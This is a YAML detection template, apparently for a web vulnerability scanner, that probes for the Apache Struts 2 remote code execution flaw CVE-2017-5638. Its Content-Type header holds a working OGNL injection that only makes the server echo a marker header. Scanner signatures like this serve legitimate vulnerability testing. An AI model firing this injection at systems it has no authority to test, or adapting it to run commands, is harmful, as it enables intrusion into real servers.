id: cve-2017-5638
info:
  name: Apache Struts 2 RCE
  risk: Critical

params:
  - root: '{{.BaseURL}}'

variables:
requests:
  - method: GET
    url: >-
      {{.root}}
    headers:
      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
      - Content-Type: "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Jaeles','cvebase')}.multipart/form-data"
      - Pragma: no-cache
      - Accept: 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'
    detections:
      - >-
        StatusCode() == 200 && StringSearch("resHeaders", "X-Jaeles: cvebase")

references:
  - https://www.cvebase.com/cve/2017/5638
